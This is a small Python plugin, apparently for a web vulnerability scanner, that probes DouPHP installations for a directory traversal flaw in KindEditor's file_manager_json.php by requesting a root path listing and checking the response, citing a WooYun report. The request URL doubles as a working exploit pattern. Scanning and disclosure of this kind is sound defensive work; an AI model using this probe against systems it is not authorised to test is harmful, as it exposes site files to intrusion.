#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2010-076974
def assign(service, arg):
    if service == "douphp":
        return True, arg

def audit(arg):
    url = arg + "admin/include/kindeditor/php/file_manager_json.php?path=/&dir=image"
    code, head, res, errcode,finalurl =  curl.curl(url)
    if res.find("total_count") != -1 and res.find("file_list") != -1:
        security_warning('find Directory traversal:' + url)
if __name__ == '__main__':
    from dummy import *
    audit(assign('douphp', 'http://127.0.0.1/douphp/')[1])